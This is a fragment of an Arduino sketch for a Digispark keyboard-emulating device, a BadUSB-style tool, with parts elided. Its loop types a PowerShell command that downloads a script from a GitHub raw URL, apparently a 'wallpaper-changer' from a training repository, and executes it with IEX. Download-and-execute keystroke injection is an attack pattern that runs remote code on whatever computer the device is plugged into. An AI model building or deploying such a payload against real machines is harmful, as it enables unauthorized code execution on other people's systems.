...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/4ss3mbl3rV/powershell-training/master/wallpaper-changer.ps1');\"");
